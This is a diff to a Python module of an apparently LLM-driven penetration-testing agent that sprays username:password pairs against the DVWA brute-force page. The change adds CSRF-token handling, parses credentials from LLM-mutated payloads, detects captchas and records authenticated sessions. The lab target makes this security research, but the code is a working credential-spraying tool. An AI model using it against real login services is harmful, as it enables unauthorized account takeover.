@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import logging
+import re
 import time as time_mod
 from typing import Any
 
@@ -10,23 +11,38 @@ from agents.agent_telemetry import exploit_event, probe_event, score_event
 from agents.state_utils import already_tried_payloads, candidate_payloads_for_stage, chain_check as _chain_check, make_update, normalize_security_level
 from core.state import ExploitationState, MODULE_TO_KG_NODE
 from foundation.session_manager import DVWASession
-from foundation.verifier import Verifier
+from foundation.verifier import Verifier, has_captcha_challenge
 
 logger = logging.getLogger(__name__)
 
 AGENT_ID = "bf_spray"
 MODULE_PATH = "/vulnerabilities/brute/"
 _PROBE_OBSERVATION_KEY = "no_rate_limit"
+_CREDENTIAL_PREFIX = re.compile(r"^\s*([^:,;\s]+)\s*:\s*([^,;\s]+)")
 
 _SUCCESS_SIGNALS = [
     "welcome to the password protected area",
     "password protected area",
 ]
-_CAPTCHA_SIGNALS = [
-    "captcha",
-    "recaptcha",
-    "please enter the captcha",
-]
+
+
+def _module_user_token(session: DVWASession) -> str | None:
+    """Fetch the brute-force form token without exposing its value."""
+    try:
+        page = session.get(MODULE_PATH)
+        extractor = getattr(session, "_extract_user_token", None)
+        token = extractor(page.text) if callable(extractor) else None
+        return token if isinstance(token, str) and token else None
+    except Exception as exc:
+        logger.warning("[%s] Could not fetch module CSRF token: %s", AGENT_ID, exc)
+        return None
+
+
+def _credential_params(username: str, password: str, user_token: str | None) -> dict[str, str]:
+    params = {"username": username, "password": password, "Login": "Login"}
+    if user_token:
+        params["user_token"] = user_token
+    return params
 
 
 def _probe_preconditions(
@@ -35,6 +51,7 @@ def _probe_preconditions(
     already_tried: set[str],
     *,
     cached_precondition: bool | None = None,
+    user_token: str | None = None,
 ) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
     """Send rapid requests to detect rate limiting.
 
@@ -62,7 +79,7 @@ def _probe_preconditions(
         try:
             resp = session.get(
                 MODULE_PATH,
-                params={"username": username, "password": password, "Login": "Login"},
+                params=_credential_params(username, password, user_token),
             )
             events.append(probe_event(AGENT_ID, cred, resp.status_code, True))
         except Exception as exc:
@@ -88,16 +105,19 @@ def _probe_preconditions(
 
 
 def _parse_credential(payload: str) -> tuple[str, str]:
-    """Parse a 'username:password' payload string."""
-    if ":" in payload:
-        parts = payload.split(":", 1)
-        return parts[0].strip(), parts[1].strip()
-    return "", ""
+    """Parse only the leading credential pair from candidate logic.
+
+    LLM strategy mutations may append pacing/order prose after a valid pair.
+    Never send that prose as the password; only the strict credential prefix
+    is transport data.
+    """
+    match = _CREDENTIAL_PREFIX.match(str(payload))
+    return (match.group(1), match.group(2)) if match else ("", "")
 
 
 def _attempt_exploit(
     session: DVWASession, payloads: list[str], already_tried: set[str],
-    security_level: str,
+    security_level: str, user_token: str | None = None,
 ) -> tuple[int, list[str], list[str], list[dict], list[dict[str, str]], bool]:
     """Try credential spray. Returns (score, tried, confirmed, events, found_credentials)."""
     tried: list[str] = []
@@ -120,12 +140,11 @@ def _attempt_exploit(
         try:
             resp = session.get(
                 MODULE_PATH,
-                params={"username": username, "password": password, "Login": "Login"},
+                params=_credential_params(username, password, user_token),
             )
             events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))
 
-            captcha_result = verifier.contains_any(resp.text, _CAPTCHA_SIGNALS)
-            if captcha_result.ok:
+            if has_captcha_challenge(resp.text):
                 return 0, tried, [], events, [], True
 
             success_result = verifier.contains_any(resp.text, _SUCCESS_SIGNALS)
@@ -175,6 +194,7 @@ def bf_spray_agent(state: ExploitationState) -> dict[str, Any]:
                 failure_agents=[AGENT_ID],
             )
         session.set_security_level(security_level)
+        user_token = _module_user_token(session)
 
         already_tried = already_tried_payloads(state, AGENT_ID)
         confirmed_vulns: list[str] = []
@@ -189,7 +209,11 @@ def bf_spray_agent(state: ExploitationState) -> dict[str, Any]:
         probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe") or ["rate_test:test", "probe:probe"]
         cached_no_rate_limit = state.get("observations", {}).get(_PROBE_OBSERVATION_KEY)
         probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
-            session, probe_payloads, already_tried, cached_precondition=cached_no_rate_limit
+            session,
+            probe_payloads,
+            already_tried,
+            cached_precondition=cached_no_rate_limit,
+            user_token=user_token,
         )
         all_tried.extend(tried)
         telemetry_events.extend(probe_events)
@@ -211,7 +235,11 @@ def bf_spray_agent(state: ExploitationState) -> dict[str, Any]:
         ]
 
         exploit_score, tried, confirmed, exploit_events, creds, captcha_boundary = _attempt_exploit(
-            session, all_exploit, already_tried | set(all_tried), security_level,
+            session,
+            all_exploit,
+            already_tried | set(all_tried),
+            security_level,
+            user_token=user_token,
         )
         if captcha_boundary:
             all_tried.extend(tried)
@@ -235,6 +263,8 @@ def bf_spray_agent(state: ExploitationState) -> dict[str, Any]:
         score = max(score, exploit_score)
         confirmed_vulns.extend(confirmed)
         found_credentials.extend(creds)
+        if confirmed_vulns:
+            achieved_outcomes.append("authenticated_session")
 
         # Stage 3: CHAIN CHECK
         if confirmed_vulns:
